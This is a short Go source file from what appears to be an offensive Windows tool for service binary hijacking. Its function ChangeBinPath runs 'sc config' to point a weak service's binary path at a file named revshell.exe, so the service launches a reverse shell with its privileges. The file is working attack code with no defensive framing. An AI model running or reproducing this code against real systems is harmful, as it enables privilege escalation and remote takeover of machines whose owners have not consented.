package enumwin

import (
	"fmt"
	"os"
	"os/exec"
)

func ChangeBinPath(serv *WeakServ) {
	fmt.Println(serv.BinPath)
	homeDir, _ := os.UserHomeDir()

	malPath := fmt.Sprintf(homeDir + "\\win-binary-hijacking\\internal\\malbinaries\\revshell.exe")

	cmdFormat := fmt.Sprintf("binpath=%q", malPath)

	fmt.Println(cmdFormat)
	cmd := exec.Command("sc", "config", serv.Name, cmdFormat)

	err := cmd.Run()

	if err != nil {
		fmt.Println(err, "Error")
	}
}
